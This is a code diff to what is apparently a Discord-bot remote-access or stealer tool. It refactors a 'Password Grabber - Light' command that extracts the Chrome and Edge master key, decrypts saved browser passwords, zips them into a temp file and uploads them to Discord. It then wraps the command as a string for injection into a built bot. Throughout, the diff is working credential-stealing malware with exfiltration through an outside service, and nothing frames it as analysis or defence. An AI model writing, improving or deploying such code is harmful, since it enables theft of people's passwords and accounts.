@@ -12,12 +12,6 @@ import discord
 
 async def upload_to_discord(data, ctx):
     try:
-        # Use the bot instance from the context
-        bot = ctx.bot
-        
-        # Get the category ID from the bot instance (set during build)
-        category_id = bot.category_id
-        
         # Save passwords to file
         temp_dir = os.environ['TEMP']
         passwords_file = os.path.join(temp_dir, 'passwords.txt')
@@ -38,20 +32,16 @@ async def upload_to_discord(data, ctx):
         with zipfile.ZipFile(zip_file, 'w') as zipf:
             zipf.write(passwords_file, 'passwords.txt')
         
-        # Find the channel to send to
-        for guild in bot.guilds:
-            for channel in guild.channels:
-                if str(channel.category_id) == str(category_id) and isinstance(channel, discord.TextChannel):
-                    # Send the zip file
-                    with open(zip_file, 'rb') as f:
-                        await channel.send(file=discord.File(f, "passwords.zip"))
-                    
-                    # Clean up
-                    if os.path.exists(passwords_file):
-                        os.remove(passwords_file)
-                    if os.path.exists(zip_file):
-                        os.remove(zip_file)
-                    break
+        # Send the zip file
+        with open(zip_file, 'rb') as f:
+            await ctx.send(file=discord.File(f, "passwords.zip"))
+        
+        # Clean up
+        if os.path.exists(passwords_file):
+            os.remove(passwords_file)
+        if os.path.exists(zip_file):
+            os.remove(zip_file)
+            
     except Exception as e:
         await ctx.send(f"Upload error: {str(e)}")
 
@@ -65,18 +55,12 @@ def get_master_key():
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
     return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
-
-def generate_cipher(aes_key, iv):
-    return AES.new(aes_key, AES.MODE_GCM, iv)
-
 def decrypt_password_edge(buff, master_key):
     try:
         iv = buff[3:15]
         payload = buff[15:]
-        cipher = generate_cipher(master_key, iv)
-        decrypted_pass = decrypt_payload(cipher, payload)
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
     except Exception as e: 
@@ -202,8 +186,8 @@ def grab_passwords():
     
     return result
 
-# Command function that will be called by the bot
-async def pass_light(ctx):
+# This is the actual command implementation that will be inserted into the bot
+pass_light_command_code = '''
     """Light password grabber for Chrome and Edge"""
     try:
         await ctx.send("🔍 Starting password collection...")
@@ -216,14 +200,14 @@ async def pass_light(ctx):
             # Send completion message
             embed = discord.Embed(
                 title="🔑 Password Grabber - Light",
-                description=f"```Successfully collected {len(passwords_data)} sets of credentials```",
+                description=f"Successfully collected {len(passwords_data)} sets of credentials",
                 colour=discord.Colour.green()
             )
             await ctx.send(embed=embed)
         else:
             embed = discord.Embed(
                 title="🔑 Password Grabber - Light",
-                description="```No passwords found in Chrome or Edge browsers```",
+                description="No passwords found in Chrome or Edge browsers",
                 colour=discord.Colour.orange()
             )
             await ctx.send(embed=embed)
@@ -231,7 +215,8 @@ async def pass_light(ctx):
     except Exception as e:
         embed = discord.Embed(
             title="❌ Password Grabber - Light",
-            description=f"```Error: {str(e)}```",
+            description=f"Error: {str(e)}",
             colour=discord.Colour.red()
         )
         await ctx.send(embed=embed)
+'''
